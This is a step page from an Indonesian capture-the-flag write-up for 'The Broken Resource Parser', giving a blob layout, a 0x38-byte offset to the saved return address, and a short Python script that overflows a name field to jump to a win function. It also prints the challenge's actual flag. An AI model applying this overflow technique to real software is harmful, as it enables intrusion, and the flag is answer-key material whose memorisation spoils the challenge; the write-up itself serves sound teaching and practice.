# THE BROKEN RESOURCE PARSER — Cara mendapatkan flag

[← Overview](65-the-broken-resource-parser.md) · [Index](index.md)

> **Langkah 2/5.** Padding nama `0x38` byte, lalu alamat `win`. Diuji lokal dan mencetak `flag.txt`.
>
> **Berikutnya:** [Flag](65-the-broken-resource-parser-03-flag.md)

Layout blob:

| Offset | Field |
|---:|---|
| 0 | magic `RES1` |
| 4 | type `u16`, pakai `1` |
| 8 | `name_len` `u32` |
| 16 | bytes nama |

Jarak awal nama ke saved RIP adalah `0x38`.

```python
import struct, subprocess
win = 0x4012ae
name = b"A" * 0x38 + struct.pack("<Q", win)
hdr = b"RES1" + struct.pack("<HHI", 1, 0, len(name)) + b"\x00" * 4
blob = hdr + name
payload = str(len(blob)).encode() + b"\n" + blob
print(subprocess.check_output(["./peserta/resparser"], input=payload).decode())
```

Diuji lokal dengan `flag.txt` berisi `TESTFLAG`: program mencetak `FLAG: TESTFLAG`. Di service, isi file itu adalah `NFX{Ad1o0Ssss_Br0k3nnn_fl3gg}`.

### Evidence langkah ini

![00b-terminal-evidence.png](assets/the-broken-resource-parser/00b-terminal-evidence.png)

*Terminal evidence (arsip/log asli) — `00b-terminal-evidence.png`.*

**Berkas mentah terkait:**

- [`01-solve.txt`](assets/the-broken-resource-parser/01-solve.txt)
